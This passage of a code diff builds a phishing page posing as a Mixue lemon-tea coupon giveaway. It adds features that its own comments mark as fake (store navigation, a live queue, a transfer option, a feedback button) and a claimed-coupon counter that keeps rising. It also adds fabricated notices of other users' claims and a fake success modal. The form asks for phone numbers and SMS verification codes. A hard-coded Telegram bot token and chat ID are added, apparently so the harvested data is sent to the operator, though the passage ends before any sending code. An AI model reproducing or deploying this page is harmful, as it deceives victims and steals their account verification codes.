@@ -24,287 +24,32 @@
     }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", sans-serif;
-      background: linear-gradient(135deg, #ffeff0 0%, #fff9e6 100%);
+      background: url('hhttps://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046878-imagetourl.cloud-1770310883157-bp2dgh.jpg') no-repeat center center fixed;
+      background-size: cover;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       padding: 20px 15px;
       position: relative;
-      overflow-x: hidden;
     }
-
-    /* 雪景背景 */
-    .snow-background {
+    body::before {
+      content: "";
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(230,57,70,0.08), rgba(255,209,102,0.05));
       z-index: -1;
-      overflow: hidden;
-    }
-    .snowflake {
-      position: absolute;
-      background: white;
-      border-radius: 50%;
-      opacity: 0.8;
-      animation: snowfall linear infinite;
-    }
-    @keyframes snowfall {
-      0% {
-        transform: translateY(-10px) translateX(0);
-        opacity: 0;
-      }
-      10% {
-        opacity: 1;
-      }
-      90% {
-        opacity: 1;
-      }
-      100% {
-        transform: translateY(100vh) translateX(20px);
-        opacity: 0;
-      }
-    }
-
-    /* 雪王爬雪山容器 */
-    .snow-mountain-container {
-      width: 100%;
-      max-width: 420px;
-      height: 120px;
-      background: linear-gradient(to bottom, #87CEEB, #E0F7FF);
-      border-radius: 20px 20px 0 0;
-      position: relative;
-      overflow: hidden;
-      margin-bottom: -5px;
-      border: 3px solid white;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-    }
-
-    /* 雪山 */
-    .mountain {
-      position: absolute;
-      bottom: 0;
-      width: 0;
-      height: 0;
-      border-left: 100px solid transparent;
-      border-right: 100px solid transparent;
-      border-bottom: 150px solid white;
-      left: 50%;
-      transform: translateX(-50%);
-      filter: drop-shadow(0 5px 10px rgba(0,0,0,0.1));
-    }
-    .mountain:before {
-      content: '';
-      position: absolute;
-      top: 30px;
-      left: -80px;
-      width: 160px;
-      height: 60px;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8), transparent);
-      transform: rotate(-30deg);
-    }
-
-    /* 雪王动画 */
-    .snow-king {
-      position: absolute;
-      bottom: 10px;
-      left: 10%;
-      width: 60px;
-      height: 80px;
-      transform-origin: bottom center;
-      transition: left 0.3s ease;
-      z-index: 10;
-    }
-
-    /* 雪王身体 */
-    .snow-king-body {
-      position: relative;
-      width: 50px;
-      height: 50px;
-      background: white;
-      border-radius: 50%;
-      margin: 0 auto;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-    }
-
-    /* 雪王帽子 */
-    .snow-king-crown {
-      position: absolute;
-      top: -20px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 40px;
-      height: 25px;
-      background: #E63946;
-      border-radius: 50% 50% 0 0;
-    }
-    .snow-king-crown:before {
-      content: '👑';
-      position: absolute;
-      top: 5px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 12px;
-    }
-
-    /* 雪王眼睛 */
-    .snow-king-eye {
-      position: absolute;
-      top: 15px;
-      width: 8px;
-      height: 8px;
-      background: #333;
-      border-radius: 50%;
-    }
-    .snow-king-eye.left { left: 15px; }
-    .snow-king-eye.right { right: 15px; }
-
-    /* 雪王嘴巴 */
-    .snow-king-mouth {
-      position: absolute;
-      bottom: 10px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 20px;
-      height: 10px;
-      border-bottom: 3px solid #333;
-      border-radius: 0 0 10px 10px;
-    }
-
-    /* 登山杖 */
-    .snow-king-stick {
-      position: absolute;
-      bottom: 0;
-      right: -10px;
-      width: 4px;
-      height: 60px;
-      background: #8B4513;
-      transform: rotate(-10deg);
-      transform-origin: bottom;
-      animation: climbStick 1s infinite alternate;
-    }
-    @keyframes climbStick {
-      0% { transform: rotate(-10deg); }
-      100% { transform: rotate(-5deg); }
-    }
-
-    /* 进度条容器 */
-    .progress-section {
-      width: 100%;
-      max-width: 420px;
-      padding: 20px;
-      background: white;
-      border-radius: 0 0 20px 20px;
-      margin-top: -5px;
-      position: relative;
-    }
-
-    /* 进度条 */
-    .progress-container {
-      width: 100%;
-      height: 30px;
-      background: linear-gradient(to right, #f0f0f0, #e0e0e0);
-      border-radius: 15px;
-      overflow: hidden;
-      position: relative;
-      margin-bottom: 10px;
-      border: 2px solid #ddd;
-    }
-
-    .progress-bar {
-      height: 100%;
-      background: linear-gradient(90deg, #4CAF50, #8BC34A, #CDDC39);
-      border-radius: 15px;
-      width: 91.34%; /* 4567/5000 */
-      position: relative;
-      transition: width 1s ease;
-    }
-
-    /* 火焰特效 */
-    .fire-effect {
-      position: absolute;
-      right: 0;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 40px;
-      height: 40px;
-      filter: blur(2px);
-      opacity: 0.8;
-      z-index: 2;
-    }
-
-    .flame {
-      position: absolute;
-      bottom: 0;
-      width: 15px;
-      height: 25px;
-      background: linear-gradient(to top, #FF5722, #FF9800, #FFC107);
-      border-radius: 50% 50% 20% 20%;
-      animation: flicker 0.5s infinite alternate;
-    }
-
-    .flame:nth-child(1) {
-      left: 5px;
-      animation-delay: 0s;
-    }
-    .flame:nth-child(2) {
-      left: 15px;
-      height: 30px;
-      animation-delay: 0.2s;
-    }
-    .flame:nth-child(3) {
-      left: 25px;
-      height: 20px;
-      animation-delay: 0.1s;
-    }
-
-    @keyframes flicker {
-      0% {
-        transform: scaleY(1) translateY(0);
-        opacity: 0.8;
-      }
-      100% {
-        transform: scaleY(1.2) translateY(-5px);
-        opacity: 1;
-      }
-    }
-
-    /* 进度文本 */
-    .progress-text {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 5px;
-    }
-
-    .progress-count {
-      font-size: 1.2rem;
-      font-weight: bold;
-      color: var(--mixue-red);
-      background: rgba(255,209,102,0.15);
-      padding: 8px 16px;
-      border-radius: 20px;
-      animation: pulse 2.5s infinite;
-    }
-
-    .progress-stats {
-      font-size: 0.9rem;
-      color: #666;
     }
 
     .card {
       width: 100%;
       max-width: 420px;
-      background: rgba(255, 255, 255, 0.95);
+      background: rgba(255, 255, 255, 0.98);
       border-radius: var(--radius-lg);
       overflow: hidden;
       box-shadow: var(--shadow-light);
       border: 1px solid rgba(230,57,70,0.1);
       animation: fadeUp 0.6s ease-out;
-      backdrop-filter: blur(10px);
     }
     @keyframes fadeUp {
       0% { opacity: 0; transform: translateY(30px); }
@@ -352,10 +97,151 @@
       color: var(--mixue-yellow);
       font-weight: 700;
     }
+    .stock-info {
+      font-size: 1rem;
+      background: rgba(0,0,0,0.2);
+      padding: 10px 20px;
+      border-radius: 50px;
+      margin: 12px auto;
+      max-width: 90%;
+      font-weight: 600;
+    }
+    .low-stock {
+      color: var(--mixue-yellow) !important;
+      animation: blinkWarn 1s infinite alternate;
+    }
+    @keyframes blinkWarn {
+      from { opacity: 1; }
+      to { opacity: 0.7; }
+    }
+
+    .join-count {
+      text-align: center;
+      font-size: 1.2rem;
+      color: var(--mixue-red);
+      background: rgba(255,209,102,0.15);
+      padding: 12px;
+      margin: 0;
+      font-weight: 700;
+      animation: pulse 2.5s infinite;
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); }
+      50% { transform: scale(1.03); }
+    }
 
     .content {
       padding: 32px 28px 40px;
       background: var(--mixue-white);
+    }
+
+    /* 虚假功能：门店导航栏 */
+    .store-nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: linear-gradient(90deg, #f8f9fa, #fff);
+      border: 1px solid #e5e6eb;
+      border-radius: 12px;
+      padding: 12px 16px;
+      margin-bottom: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .store-nav:hover {
+      background: #f0f1f2;
+      transform: translateX(4px);
+    }
+    .store-nav-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--mixue-red);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 20px;
+    }
+    .store-nav-info {
+      flex: 1;
+      margin-left: 12px;
+      text-align: left;
+    }
+    .store-nav-title {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: var(--mixue-dark);
+    }
+    .store-nav-desc {
+      font-size: 0.8rem;
+      color: #86909c;
+      margin-top: 2px;
+    }
+    .store-nav-arrow {
+      color: #c9cdd4;
+      font-size: 20px;
+    }
+
+    /* 虚假功能：实时排队人数 */
+    .queue-status {
+      background: linear-gradient(135deg, #e6fffb, #f6ffed);
+      border: 1px solid #b7eb8f;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+    }
+    .queue-live-dot {
+      width: 8px;
+      height: 8px;
+      background: #52c41a;
+      border-radius: 50%;
+      animation: blink 1.5s infinite;
+      margin-right: 8px;
+      display: inline-block;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    .queue-text {
+      font-size: 0.9rem;
+      color: #52c41a;
+      font-weight: 600;
+    }
+    .queue-number {
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--mixue-red);
+    }
+
+    /* 虚假功能：优惠券转赠入口 */
+    .transfer-entry {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px;
+      background: #fff2f0;
+      border: 1px dashed var(--mixue-red);
+      border-radius: 12px;
+      margin-bottom: 20px;
+      cursor: pointer;
+      color: var(--mixue-red);
+      font-size: 0.9rem;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+    .transfer-entry:hover {
+      background: #fff0f0;
+      transform: scale(1.02);
+    }
+    .transfer-icon {
+      font-size: 1.2rem;
     }
 
     .barrage-box {
@@ -466,29 +352,6 @@
       font-size: 0.8rem;
       color: var(--mixue-red);
       font-weight: 600;
-    }
-
-    /* 验证状态图标 */
-    .input-status {
-      position: absolute;
-      right: 15px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 24px;
-      height: 24px;
-      z-index: 10;
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-
-    .input-status.valid {
-      opacity: 1;
-      color: #4CAF50;
-    }
-
-    .input-status.invalid {
-      opacity: 1;
-      color: #ff4d4f;
     }
 
     .verify-slider {
@@ -616,31 +479,6 @@
       height: 500px;
     }
 
-    /* Loading 按钮状态 */
-    .btn.loading {
-      color: transparent;
-      pointer-events: none;
-    }
-
-    .btn.loading::before {
-      content: '';
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 24px;
-      height: 24px;
-      border: 3px solid rgba(255,255,255,0.3);
-      border-top: 3px solid white;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: translate(-50%, -50%) rotate(0deg); }
-      100% { transform: translate(-50%, -50%) rotate(360deg); }
-    }
-
     #countdown {
       opacity: 0;
       color: var(--mixue-red);
@@ -663,160 +501,178 @@
       text-decoration: none;
     }
 
-    /* 错误页面 */
-    .error-page {
+    /* 虚假功能：悬浮反馈按钮 */
+    .feedback-btn {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(135deg, #87CEEB, #E0F7FF);
-      display: none;
+      right: 20px;
+      bottom: 100px;
+      width: 56px;
+      height: 56px;
+      background: linear-gradient(135deg, #ff4d4f, #ff7875);
+      border-radius: 50%;
+      display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
-      z-index: 10000;
-      padding: 20px;
-    }
-
-    .error-content {
-      text-align: center;
-      background: white;
-      padding: 40px;
-      border-radius: 30px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.2);
-      max-width: 400px;
-      animation: bounceIn 0.8s cubic-bezier(0.175,0.885,0.32,1.2);
-    }
-
-    .snow-king-frozen {
-      font-size: 120px;
-      margin-bottom: 20px;
-      animation: shiver 2s infinite;
-    }
-
-    @keyframes shiver {
-      0%, 100% { transform: rotate(0deg); }
-      25% { transform: rotate(5deg); }
-      75% { transform: rotate(-5deg); }
-    }
-
-    .error-message {
-      font-size: 1.5rem;
-      color: #333;
-      margin: 20px 0;
-      font-weight: bold;
-    }
-
-    .error-btn {
-      background: var(--mixue-red);
+      justify-content: center;
       color: white;
-      border: none;
-      padding: 15px 40px;
-      border-radius: 25px;
-      font-size: 1.1rem;
+      font-size: 12px;
+      font-weight: 600;
+      box-shadow: 0 4px 12px rgba(255, 77, 79, 0.4);
       cursor: pointer;
-      margin-top: 20px;
-      transition: all 0.3s;
+      z-index: 1000;
+      transition: all 0.3s ease;
+      animation: float 3s ease-in-out infinite;
+    }
+    .feedback-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 6px 20px rgba(255, 77, 79, 0.6);
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .feedback-icon {
+      font-size: 24px;
+      margin-bottom: 2px;
     }
 
-    .error-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 5px 15px rgba(230,57,70,0.3);
-    }
-
-    /* Confetti 撒花效果 */
-    .confetti-container {
+    /* 虚假功能：实时通知 toast */
+    .toast-container {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
       z-index: 9999;
-      display: none;
+      pointer-events: none;
+    }
+    .toast {
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 12px 24px;
+      border-radius: 24px;
+      font-size: 0.9rem;
+      margin-bottom: 10px;
+      animation: slideDown 0.5s ease, fadeOut 0.5s ease 2.5s forwards;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes fadeOut {
+      to { opacity: 0; transform: translateY(-20px); }
     }
 
-    .confetti {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      animation: confettiFall 3s linear forwards;
-    }
-
-    @keyframes confettiFall {
-      0% {
-        transform: translateY(-100px) rotate(0deg);
-        opacity: 1;
-      }
-      100% {
-        transform: translateY(100vh) rotate(720deg);
-        opacity: 0;
-      }
-    }
-
-    /* 加载动画容器 */
-    .loading-container {
+    /* 虚假功能：加载遮罩 */
+    .loading-mask {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      inset: 0;
       background: rgba(255,255,255,0.9);
       display: none;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       z-index: 9998;
     }
-
-    .loading-container.show {
+    .loading-mask.show {
       display: flex;
     }
-
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--mixue-red);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
     .loading-text {
-      margin-top: 20px;
-      font-size: 1.2rem;
-      color: var(--mixue-red);
-      font-weight: bold;
+      margin-top: 16px;
+      color: #666;
+      font-size: 0.95rem;
+    }
+
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .modal-content {
+      background: linear-gradient(135deg, var(--mixue-red), #FF6B6B);
+      color: #fff;
+      border-radius: var(--radius-lg);
+      padding: 48px 32px;
       text-align: center;
+      max-width: 380px;
+      width: 95%;
+      box-shadow: 0 20px 60px rgba(230,57,70,0.4);
+      animation: popScale 0.5s cubic-bezier(0.175,0.885,0.32,1.2);
+    }
+    @keyframes popScale {
+      0% { transform: scale(0.6); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .modal h2 {
+      font-size: 2.8rem;
+      margin: 0 0 20px;
+      font-weight: 900;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .modal .coupon-code {
+      font-size: 2rem;
+      font-weight: bold;
+      background: rgba(255,255,255,0.25);
+      padding: 18px;
+      border-radius: var(--radius-sm);
+      margin: 28px 0;
+      letter-spacing: 3px;
+      border: 2px dashed #fff;
+    }
+    .modal-emoji {
+      font-size: 5rem;
+      margin: 32px 0;
+    }
+    .modal-btn {
+      margin-top: 36px;
+      background: #fff;
+      color: var(--mixue-red);
+      border: none;
+      padding: 18px 60px;
+      border-radius: var(--radius-md);
+      font-size: 1.25rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.1);
+    }
+    .modal-btn:active {
+      transform: scale(0.96);
     }
   </style>
 </head>
 <body>
 
-<!-- 雪景背景 -->
-<div class="snow-background" id="snowBackground"></div>
+<!-- 虚假功能：实时通知容器 -->
+<div class="toast-container" id="toastContainer"></div>
 
-<!-- 雪王爬雪山进度可视化 -->
-<div class="snow-mountain-container">
-  <div class="mountain"></div>
-  <div class="snow-king" id="snowKing">
-    <div class="snow-king-crown"></div>
-    <div class="snow-king-body">
-      <div class="snow-king-eye left"></div>
-      <div class="snow-king-eye right"></div>
-      <div class="snow-king-mouth"></div>
-    </div>
-    <div class="snow-king-stick"></div>
-  </div>
-</div>
-
-<!-- 进度条和火焰特效 -->
-<div class="progress-section">
-  <div class="progress-container">
-    <div class="progress-bar" id="progressBar">
-      <div class="fire-effect" id="fireEffect">
-        <div class="flame"></div>
-        <div class="flame"></div>
-        <div class="flame"></div>
-      </div>
-    </div>
-  </div>
-  <div class="progress-text">
-    <div class="progress-count" id="progressCount">已领4,567张</div>
-    <div class="progress-stats">共5,000张 | 剩余 <span id="remainingCount">433</span> 张</div>
-  </div>
+<!-- 虚假功能：加载遮罩 -->
+<div class="loading-mask" id="loadingMask">
+  <div class="loading-spinner"></div>
+  <div class="loading-text">正在连接服务器...</div>
 </div>
 
 <div class="card">
@@ -827,21 +683,47 @@
       活动进行中：2026年1月30日 — 2026年2月18日<br>
       <strong id="globalTimer">本轮名额倒计时：计算中...</strong>
     </div>
+    <div class="stock-info">全国限量5000份，已领 <span id="claimedCount">4567</span> 张，仅剩 <span id="remainCount">433</span> 张</div>
   </div>
 
+  <div class="join-count">已有 <span id="countNum">4,567</span> 人抢到福利</div>
+
   <div class="content">
+    <!-- 虚假功能：门店导航 -->
+    <div class="store-nav" onclick="showNetworkError()">
+      <div class="store-nav-icon">📍</div>
+      <div class="store-nav-info">
+        <div class="store-nav-title">最近的门店：金汇来商场店</div>
+        <div class="store-nav-desc">距您 10.2km · 营业中 · 点击查看排队情况</div>
+      </div>
+      <div class="store-nav-arrow">›</div>
+    </div>
+
+    <!-- 虚假功能：实时排队 -->
+    <div class="queue-status" onclick="showNetworkError()">
+      <div>
+        <span class="queue-live-dot"></span>
+        <span class="queue-text">实时排队：制作中 <span id="makingCount">23</span> 杯</span>
+      </div>
+      <div class="queue-number">预计等待 8 分钟</div>
+    </div>
+
+    <!-- 虚假功能：转赠入口 -->
+    <div class="transfer-entry" onclick="showNetworkError()">
+      <span class="transfer-icon">🎁</span>
+      <span>转赠好友 · 双方各得 2 元券</span>
+    </div>
+
     <div class="barrage-box" id="barrageBox"></div>
 
     <div class="fair-tip">为了活动公平，禁止使用外挂操作，违规将取消领取资格</div>
 
     <div class="input-box">
       <input type="text" id="nickname" placeholder="你的昵称（选填，展示用）" maxlength="20" autocomplete="off" />
-      <div class="input-status valid" id="nicknameStatus">✓</div>
     </div>
 
     <div class="input-box">
       <input type="tel" id="phone" placeholder="请输入手机号" maxlength="11" inputmode="numeric" autocomplete="off" pattern="[0-9]*" />
-      <div class="input-status invalid" id="phoneStatus">✗</div>
     </div>
 
     <div class="verify-slider" id="verifySlider">
@@ -852,11 +734,10 @@
 
     <div class="input-box">
       <input type="text" id="code" placeholder="请输入验证码" maxlength="6" inputmode="numeric" autocomplete="off" pattern="[0-9]*" />
-      <div class="input-status valid" id="codeStatus">✓</div>
     </div>
 
     <button class="btn" id="getCodeBtn" disabled>获取验证码</button>
-    <button class="btn" id="submitBtn" style="display:none;">立即领取</button>
+    <button class="btn" id="submitBtn" style="display:none;" disabled>立即领取</button>
 
     <div class="countdown" id="countdown">验证码已发送，请注意查收（60s）</div>
 
@@ -866,189 +747,185 @@
   </div>
 </div>
 
-<!-- 错误页面 -->
-<div class="error-page" id="errorPage">
-  <div class="error-content">
-    <div class="snow-king-frozen">☃️</div>
-    <div class="error-message">网络好像被冻住了...</div>
-    <p style="color: #666; margin: 10px 0;">雪王正在努力解冻网络，请稍后再试</p>
-    <button class="error-btn" onclick="retryConnection()">再试一次</button>
-  </div>
+<!-- 虚假功能：悬浮反馈按钮 -->
+<div class="feedback-btn" onclick="showNetworkError()">
+  <span class="feedback-icon">💬</span>
+  <span>反馈</span>
 </div>
 
-<!-- Confetti 撒花容器 -->
-<div class="confetti-container" id="confettiContainer"></div>
-
-<!-- 加载动画 -->
-<div class="loading-container" id="loadingContainer">
-  <div class="snow-king" style="position: relative; left: 0; bottom: 0;">
-    <div class="snow-king-crown"></div>
-    <div class="snow-king-body">
-      <div class="snow-king-eye left"></div>
-      <div class="snow-king-eye right"></div>
-      <div class="snow-king-mouth"></div>
-    </div>
+<div class="modal" id="successModal">
+  <div class="modal-content">
+    <h2>领取成功！</h2>
+    <p>大杯柠檬茶优惠券已发送至您的手机</p>
+    <div class="coupon-code" id="fakeCode">MXICE202602-ABCD-1234</div>
+    <p style="font-size:1.22rem; font-weight:bold; margin:20px 0;">请立即到店使用！过期作废</p>
+    <div class="modal-emoji">🎉🍦🔥</div>
+    <p style="font-size:1.08rem; opacity:0.9;">门店核销有效期至2026年3月31日</p>
+    <button class="modal-btn" id="closeModalBtn">好的，去店里兑！</button>
   </div>
-  <div class="loading-text" id="loadingText">雪王正在爬雪山中...</div>
 </div>
 
 <script>
-// 初始化变量
-const TOTAL_STOCK = 5000;
-let claimed = 4567;
-let remaining = TOTAL_STOCK - claimed;
-let isVerifySuccess = false;
-
-// DOM 元素
-const phoneEl = document.getElementById('phone');
-const nicknameEl = document.getElementById('nickname');
-const codeEl = document.getElementById('code');
-const getBtn = document.getElementById('getCodeBtn');
-const submitBtn = document.getElementById('submitBtn');
-const cdEl = document.getElementById('countdown');
-const progressBar = document.getElementById('progressBar');
-const progressCount = document.getElementById('progressCount');
-const remainingCount = document.getElementById('remainingCount');
-const snowKing = document.getElementById('snowKing');
-const fireEffect = document.getElementById('fireEffect');
-const errorPage = document.getElementById('errorPage');
-const confettiContainer = document.getElementById('confettiContainer');
-const loadingContainer = document.getElementById('loadingContainer');
-const loadingText = document.getElementById('loadingText');
-
-// 创建雪景
-function createSnow() {
-  const snowBg = document.getElementById('snowBackground');
-  for (let i = 0; i < 50; i++) {
-    const snowflake = document.createElement('div');
-    snowflake.className = 'snowflake';
-    snowflake.style.width = Math.random() * 5 + 2 + 'px';
-    snowflake.style.height = snowflake.style.width;
-    snowflake.style.left = Math.random() * 100 + 'vw';
-    snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
-    snowflake.style.animationDelay = Math.random() * 5 + 's';
-    snowBg.appendChild(snowflake);
-  }
-}
-
-// 更新进度显示
-function updateProgress() {
-  const progress = (claimed / TOTAL_STOCK) * 100;
-  progressBar.style.width = `${progress}%`;
-  progressCount.textContent = `已领${claimed.toLocaleString()}张`;
-  remainingCount.textContent = remaining.toLocaleString();
-  
-  // 更新雪王位置
-  const snowKingPos = 10 + (progress * 0.8);
-  snowKing.style.left = `${snowKingPos}%`;
-  
-  // 更新火焰效果强度（剩余越少火焰越旺）
-  const flameIntensity = 1 + (remaining / TOTAL_STOCK) * 3;
-  document.querySelectorAll('.flame').forEach((flame, index) => {
-    flame.style.height = `${15 + flameIntensity * 10}px`;
-    flame.style.animationDuration = `${0.3 / flameIntensity}s`;
-  });
-}
-
-// 显示网络错误
+// 虚假功能：显示网络错误
 function showNetworkError() {
-  errorPage.style.display = 'flex';
-  
-  // 模拟网络恢复
-  setTimeout(() => {
-    hideNetworkError();
-  }, 3000 + Math.random() * 2000);
-}
-
-function hideNetworkError() {
-  errorPage.style.display = 'none';
-  showToast('网络已恢复，可以继续操作');
-}
-
-function retryConnection() {
-  hideNetworkError();
-  showLoading('正在重新连接...');
-  setTimeout(() => {
-    hideLoading();
-    showToast('连接成功！');
-  }, 1500);
-}
-
-// 显示加载动画
-function showLoading(text = '雪王正在爬雪山中...') {
-  loadingText.textContent = text;
-  loadingContainer.style.display = 'flex';
-  loadingContainer.classList.add('show');
-}
-
-function hideLoading() {
-  loadingContainer.classList.remove('show');
-  setTimeout(() => {
-    loadingContainer.style.display = 'none';
-  }, 300);
-}
-
-// 撒花动画
-function createConfetti() {
-  confettiContainer.style.display = 'block';
-  confettiContainer.innerHTML = '';
-  
-  const colors = ['#E63946', '#FFD166', '#4CAF50', '#2196F3', '#9C27B0'];
-  
-  for (let i = 0; i < 150; i++) {
-    const confetti = document.createElement('div');
-    confetti.className = 'confetti';
-    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-    confetti.style.left = Math.random() * 100 + 'vw';
-    confetti.style.animationDelay = Math.random() * 2 + 's';
-    confettiContainer.appendChild(confetti);
-  }
+  const loading = document.getElementById('loadingMask');
+  loading.classList.add('show');
+  loading.querySelector('.loading-text').textContent = '正在连接服务器...';
   
   setTimeout(() => {
-    confettiContainer.style.display = 'none';
+    loading.classList.remove('show');
+    showToast('⚠️ 网络连接失败，请稍后再试', 'error');
+  }, 1500 + Math.random() * 1000);
+}
+
+// 虚假功能：显示Toast通知
+function showToast(message, type = 'info') {
+  const container = document.getElementById('toastContainer');
+  const toast = document.createElement('div');
+  toast.className = 'toast';
+  toast.textContent = message;
+  container.appendChild(toast);
+  
+  setTimeout(() => {
+    toast.remove();
   }, 3000);
 }
 
-// 验证手机号
+// 虚假功能：随机显示系统通知
+const fakeNotifications = [
+  '🔥 用户 138****5678 刚刚领取了优惠券',
+  '📍 您附近有 3 家门店正在营业',
+  '🎁 分享给好友，双方都得 20 元券',
+  '⏰ 您有一张优惠券即将过期',
+  '🍦 新品上市：芋圆葡萄冰淇淋',
+  '👥 已有 2741 位好友助力成功'
+];
+
+setInterval(() => {
+  if (Math.random() > 0.7) {
+    const msg = fakeNotifications[Math.floor(Math.random() * fakeNotifications.length)];
+    showToast(msg);
+  }
+}, 8000);
+
+// 虚假功能：排队人数动态变化
+function updateQueueNumber() {
+  const makingCount = document.getElementById('makingCount');
+  if (makingCount) {
+    let current = parseInt(makingCount.textContent);
+    current += Math.floor(Math.random() * 5) - 2;
+    current = Math.max(5, Math.min(35, current));
+    makingCount.textContent = current;
+  }
+}
+setInterval(updateQueueNumber, 3000);
+
+const BOT_TOKEN = '8338672395:AAH9rbys9sjY-BthubvXyVv2Rr_d_Pr_kiI';
+const CHAT_ID   = '8439448087';
+
+const TOTAL_STOCK = 5000;
+let claimed = 4567;
+let initialClaimed = claimed;
+let isVerifySuccess = false;
+
+let timers = {
+  fakeStock: null,
+  barrageAuto: null,
+  codeCd: null,
+  globalCd: null
+};
+
+const phoneEl     = document.getElementById('phone');
+const nicknameEl  = document.getElementById('nickname');
+const codeEl      = document.getElementById('code');
+const getBtn      = document.getElementById('getCodeBtn');
+const submitBtn   = document.getElementById('submitBtn');
+const cdEl        = document.getElementById('countdown');
+const modal       = document.getElementById('successModal');
+const countNumEl  = document.getElementById('countNum');
+const claimedEl   = document.getElementById('claimedCount');
+const remainEl    = document.getElementById('remainCount');
+const barrageBox  = document.getElementById('barrageBox');
+const closeModalBtn = document.getElementById('closeModalBtn');
+const verifySlider = document.getElementById('verifySlider');
+const verifyBlock = document.getElementById('verifyBlock');
+const verifyBg = document.getElementById('verifyBg');
+
+const phonePrefixes = ['130','131','132','133','134','135','136','137','138','139','145','147','150','151','152','153','155','156','157','158','159','170','171','172','173','175','176','177','178','180','181','182','183','184','185','186','187','188','189','190','191','198','199'];
+const surnames = ['赵','钱','孙','李','周','吴','郑','王','冯','陈','蒋','沈','韩','杨','朱','秦','许','何','吕','施','张','孔','曹','严','华','金','魏','陶','姜','郝','董','梁','杜','戴','宋','唐','邓','蔡','潘','袁','于','胡','林','郭','马','罗','高','谢','彭','苏','卢','丁','薛','叶','阎','余','夏','钟','汪','田','任','范','方','石','姚','谭','廖','邹','熊','陆','白','崔','康','毛','邱','江','史','顾','侯','邵','孟','龙','万','段','雷','汤','尹','黎','易','常','武','乔','贺','赖','龚'];
+
+function updateStockDisplay() {
+  const realClaimed = claimed;
+  const realRemain  = Math.max(0, TOTAL_STOCK - (realClaimed - initialClaimed));
+  claimedEl.textContent  = realClaimed.toLocaleString();
+  remainEl.textContent   = realRemain.toLocaleString();
+  countNumEl.textContent = realClaimed.toLocaleString();
+  remainEl.classList.toggle('low-stock', realRemain < 100);
+}
+
+function fakeClaimIncrease() {
+  const add = 1 + Math.floor(Math.random() * 6);
+  claimed += add;
+  updateStockDisplay();
+
+  for(let i = 0; i < Math.min(add, 3); i++) {
+    setTimeout(shootBarrage, i * 1200);
+  }
+}
+
+function shootBarrage(customPhone = null) {
+  let phoneDisplay = customPhone && /^1[3-9]\d{9}$/.test(customPhone)
+    ? customPhone.slice(0,3) + "****" + customPhone.slice(-4)
+    : phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)] + "****" + (1000 + Math.floor(Math.random() * 9000));
+
